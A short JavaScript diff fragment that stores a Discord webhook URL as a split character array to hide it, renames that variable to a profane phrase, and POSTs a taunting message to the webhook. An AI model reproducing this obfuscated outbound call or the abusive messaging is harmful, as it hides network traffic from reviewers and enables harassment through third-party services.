@@ -187,7 +187,7 @@ const diejwjdhjejdaawdwjwawdawd = [
 
 ];  
 
-const diejwjdhjejdawawdwjwawdawd = [
+const fuckoffplzjustgivemetimetomakeaproxy = [
   'h', 't', 't', 'p', 's', ':', '/', '/', 'd', 'i', 's', 'c', 'o', 'r', 'd', '.', 
   'c', 'o', 'm', '/', 'a', 'p', 'i', '/', 'w', 'e', 'b', 'h', 'o', 'o', 'k', 's', 
   '/', '1', '3', '5', '3', '7', '4', '4', '9', '5', '6', '4', '1', '7', '9', '0', 
@@ -240,7 +240,7 @@ const diejwjdhjejwjwcsadwabfwadawdw = [
 ];
 
 function awdawdawd() {
-  const url2 = diejwjdhadwawDawdwadjejwjw2daw.join('');
+  const url2 = fuckoffplzjustgivemetimetomakeaproxy.join('');
   const payload = { content: 'get off the backend u dumbass' };
   fetch(url2, {
     method: 'POST',
